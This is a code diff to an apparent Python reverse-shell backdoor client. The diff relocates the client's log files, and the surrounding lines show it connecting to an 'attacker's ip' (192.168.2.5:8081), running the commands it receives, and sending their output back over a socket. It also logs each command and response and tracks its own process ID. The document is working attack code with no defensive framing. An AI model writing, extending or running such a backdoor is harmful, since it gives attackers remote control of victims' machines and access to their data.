@@ -15,7 +15,7 @@ curdir = os.path.dirname(os.path.realpath(__file__)).replace('\\','/')+'/'
 usp = os.environ['USERPROFILE'].replace('\\','/')+'/'
 
 print('[c] Logging PID ...')
-open(curdir+'logs/PID.txt', 'a', encoding='utf-8').write(str(os.getpid())+'\n')
+open(curdir+'PID.txt', 'a', encoding='utf-8').write(str(os.getpid())+'\n')
 print('[c] PID Logged')
 rhost = '192.168.2.5' #attacker's ip
 rport = 8081
@@ -98,7 +98,7 @@ def main():
                 d = str(current_datetime.day)
                 m = str(current_datetime.month)
                 y = str(current_datetime.year)
-                open(curdir+'logs/response.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s\noutput :\n%s' 
+                open(curdir+'response.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s\noutput :\n%s' 
                     % (d,m,y,current_datetime.strftime('%H:%M:%S'),command,(output+output_error).decode()))
                 print('[c] Sending response ...')
                 client.send(output+output_error+'ENDOFTRANSMISSION'.encode())
@@ -121,17 +121,17 @@ def logerror(double = False):
         add = ' [catched outside main]'
     print('[c] Error catched : ' + str(sys.exc_info()[0])[8:-2] + add)
     print('[c] Logging error ...')
-    open(curdir+'logs/error.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s%s\n' % (d,m,y,current_datetime.strftime('%H:%M:%S'),str(sys.exc_info()[0])[8:-2],add))
+    open(curdir+'error.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s%s\n' % (d,m,y,current_datetime.strftime('%H:%M:%S'),str(sys.exc_info()[0])[8:-2],add))
     print('[c] Error logged')
 
 def delpidlog():
     print('[c] Deleting PID from log ...')
-    shutil.copy(curdir+'logs/PID.txt', curdir+'logs/PIDt.txt')
-    with open(curdir+'logs/PIDt.txt', 'r') as fin:
-        with open(curdir+'logs/PID.txt', 'w') as fout:
+    shutil.copy(curdir+'PID.txt', curdir+'PIDt.txt')
+    with open(curdir+'PIDt.txt', 'r') as fin:
+        with open(curdir+'PID.txt', 'w') as fout:
             for line in fin:
                 fout.write(line.replace(str(os.getpid())+'\n', ''))
-    os.remove(curdir+'logs/PIDt.txt')
+    os.remove(curdir+'PIDt.txt')
     print('[c] PID deleted from log')
 
 while True:
